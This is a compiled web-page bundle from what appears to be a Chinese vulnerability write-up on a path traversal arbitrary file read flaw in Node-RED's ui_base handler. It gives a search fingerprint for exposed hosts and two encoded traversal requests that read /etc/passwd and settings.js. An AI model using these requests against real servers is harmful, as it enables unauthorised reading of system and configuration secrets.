(window.webpackJsonp=window.webpackJsonp||[]).push([[246],{2229:function(s,t,a){s.exports=a.p+"assets/img/image-20210701185722667.c8c7b2d7.png"},2230:function(s,t,a){s.exports=a.p+"assets/img/image-20210701185812622.9601ade0.png"},2231:function(s,t,a){s.exports=a.p+"assets/img/image-20210704171045540.6cd978b7.png"},3215:function(s,t,a){"use strict";a.r(t);var e=a(64),r=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"node-red-ui-base-任意文件读取漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#node-red-ui-base-任意文件读取漏洞"}},[s._v("#")]),s._v(" Node-RED ui_base 任意文件读取漏洞")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("Node-RED 在/nodes/ui_base.js中，URL与'/ui_base/js/*'匹配，然后传递给path.join，")]),s._v(" "),t("p",[s._v("缺乏对最终路径的验证会导致路径遍历漏洞，可以利用这个漏洞读取服务器上的敏感数据，比如settings.js")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Node-RED")]),t("br"),s._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v('title="Node-RED"')]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("访问页面")]),s._v(" "),t("p",[t("img",{attrs:{src:a(2229),alt:"img"}})]),s._v(" "),t("p",[s._v("验证POC")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd\n/ui_base/js/..%2f..%2f..%2f..%2fsettings.js\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("img",{attrs:{src:a(2230),alt:"img"}})]),s._v(" "),t("p",[t("img",{attrs:{src:a(2231),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);